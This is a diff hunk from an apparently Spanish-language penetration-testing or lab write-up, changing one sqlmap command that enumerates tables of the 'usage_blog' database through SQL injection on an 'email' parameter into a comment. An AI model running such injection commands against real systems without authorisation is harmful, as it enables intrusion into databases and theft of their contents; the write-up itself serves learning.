@@ -124,7 +124,7 @@ available databases [3]:
 ```
 Hacemos lo mismo con las tablas de la base de dados "usage_blog".
 ```bash
-sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog --tables
+# sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog --tables
 <contenido omitido>
 <contenido omitido>
 ```
